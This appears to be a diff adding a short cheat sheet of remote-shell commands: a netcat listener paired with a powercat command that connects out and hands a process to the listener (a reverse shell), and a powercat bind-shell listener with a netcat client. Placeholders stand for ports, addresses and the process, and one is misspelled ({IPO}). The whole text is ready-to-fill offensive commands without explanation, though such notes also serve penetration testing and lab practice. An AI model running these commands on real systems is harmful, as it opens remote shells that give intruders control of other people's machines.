@@ -1,0 +1,14 @@
+Reverse shells
+Client
+nc -lnvp {PORT}
+
+Server
+powercat -c {IPO} -p {PORT} -e {Process}
+
+Bind shells
+
+Server
+powercat -l -p {PORT} -e {process}
+
+Client:
+nc -nv {IP} {PORT}
